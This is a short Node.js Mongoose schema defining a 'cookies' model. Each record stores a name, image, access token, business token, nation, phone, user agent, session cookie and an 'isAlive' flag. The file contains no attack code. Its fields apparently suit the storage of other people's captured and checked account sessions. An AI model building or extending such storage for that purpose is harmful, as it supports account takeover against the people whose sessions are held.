const mongoose = require("mongoose")

const dataSchema = new mongoose.Schema({
    name: String,
    image: String,
    token: String,
    tokenBusiness: String,
    nation: String,
    phone: String,
	operation: String,
    userAgent: String,
    cookie: String,
    dateTime: Date,
    isAlive: Boolean,
    isDelete: Boolean,
})

module.exports = mongoose.model("cookies", dataSchema)